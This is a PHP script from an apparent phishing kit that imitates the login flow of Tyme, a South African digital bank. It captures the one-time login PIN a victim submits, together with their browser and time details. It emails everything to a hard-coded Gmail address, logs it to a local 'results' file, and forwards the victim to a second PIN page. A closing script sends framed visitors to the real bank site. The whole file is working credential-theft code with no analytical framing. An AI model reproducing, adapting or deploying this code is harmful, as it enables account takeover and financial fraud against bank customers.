<?php
session_start();
$otp = $_POST['otp'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ Login PIN +=============\n";
$message .= "Login PIN: ".$_POST['otp']."\n";
$message .= "============= [ New Result Info ] =============\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'New Mail';
$subj = "Tyme EN | $otp";
$from = "From: $domain<west>\n";
mail("esctasy2400@gmail.com",$subj,$message,$from,$domain);
$fp = fopen("backupotp1resultsxxxxxxxxxxxxxxxxxxxxxxxxx.txt","a");
fputs($fp,$message);
fclose($fp);
header("location: otp2.html");
?>

<script language="JavaScript">
<!-- 
setTimeout ("changePage()", 1000);
function changePage() {
if (self.parent.frames.length != 0)
self.parent.location="https://bank.tymedigital.co.za";
}
// -->
</script>